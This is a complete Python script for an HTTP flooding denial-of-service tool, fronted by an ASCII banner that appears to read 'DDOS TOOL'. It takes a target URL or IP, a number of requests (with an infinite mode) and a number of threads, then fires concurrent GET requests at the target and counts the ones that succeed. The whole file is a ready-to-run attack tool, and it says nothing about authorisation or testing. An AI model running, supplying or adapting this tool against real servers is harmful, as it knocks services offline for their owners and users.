import threading
import http.client
import urllib.parse
import time
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_title():
    print("""
  _______        _______         _______        _____    ______________   _______        _______      
 |       \      |       \       /       \      /     \          |        /       \      /       \     |
 |        \     |        \     /         \    /       \         |       /         \    /         \    |
 |         \    |         \   /           \   \                 |      /           \  /           \   |
 |          |   |          |  |           |    \_____           |      |           |  |           |   |
 |          |   |          |  |           |          \          |      |           |  |           |   |
 |         /    |         /   \           /           \         |      \           /  \           /   |
 |        /     |        /     \         /    \       /         |       \         /    \         /    |
 |_______/      |_______/       \_______/      \_____/          |        \_______/      \_______/     |_________

    """)

def send_request(target_url):
    try:
        parsed = urllib.parse.urlparse(target_url)
        conn = None
        if parsed.scheme == 'http':
            conn = http.client.HTTPConnection(parsed.netloc, timeout=1)
        elif parsed.scheme == 'https':
            conn = http.client.HTTPSConnection(parsed.netloc, timeout=1)
        else:
            print(f"Unsupported URL scheme: {parsed.scheme}")
            return False

        path = parsed.path or '/'
        if parsed.query:
            path += '?' + parsed.query

        conn.request("GET", path)
        resp = conn.getresponse()
        resp.read()  # consume response to free connection
        conn.close()
        return True
    except Exception:
        return False

def worker(target, count, counter, lock):
    for _ in range(count):
        if send_request(target):
            with lock:
                counter[0] += 1
                print(f"Requests sent: {counter[0]}", end='\r')
        else:
            print(f"[!] Failed to connect to {target}", end='\r')

def main():
    clear_screen()
    show_title()

    target = input("Enter target URL or IP (e.g. http://127.0.0.1): ").strip()
    count_input = input("Enter number of requests (0 for infinite): ").strip()
    threads_input = input("Enter number of threads (e.g. 50): ").strip()

    try:
        total_requests = int(count_input)
        num_threads = max(1, int(threads_input))
    except ValueError:
        print("Invalid input.")
        return

    counter = [0]
    lock = threading.Lock()

    print("\nStarting...\n")

    try:
        if total_requests == 0:
            # infinite mode
            while True:
                threads = []
                for _ in range(num_threads):
                    t = threading.Thread(target=worker, args=(target, 1, counter, lock))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
        else:
            per_thread = total_requests // num_threads
            remainder = total_requests % num_threads
            threads = []

            for i in range(num_threads):
                count = per_thread + (1 if i < remainder else 0)
                t = threading.Thread(target=worker, args=(target, count, counter, lock))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    print("\nDone sending requests.")

if __name__ == "__main__":
    main()
